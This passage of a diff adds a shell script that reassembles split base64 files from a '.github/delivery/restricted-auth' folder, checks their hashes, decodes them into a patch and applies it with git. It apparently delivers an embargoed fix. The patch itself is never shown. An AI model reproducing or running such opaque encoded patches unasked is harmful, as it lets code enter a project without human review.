@@ -1,0 +1,10 @@
+set -euo pipefail
+D=.github/delivery/restricted-auth
+cat "$D"/part-* > /tmp/fix.patch.gz.b64
+echo 'a8d39a68d20f8fe4e3cfc401ece427c1448fb343eb5a64678353872c8fcdfe9c  /tmp/fix.patch.gz.b64' | sha256sum -c -
+base64 -d /tmp/fix.patch.gz.b64 | gzip -d > /tmp/fix.patch
+echo '5f9d10bffaba706c29b430329c2cda04cbf829f4c71fa633a442d516da67b373  /tmp/fix.patch' | sha256sum -c -
+git apply --3way --check /tmp/fix.patch
+git apply --3way /tmp/fix.patch
+git diff --check
+python -m pip install -q -r requirements.t
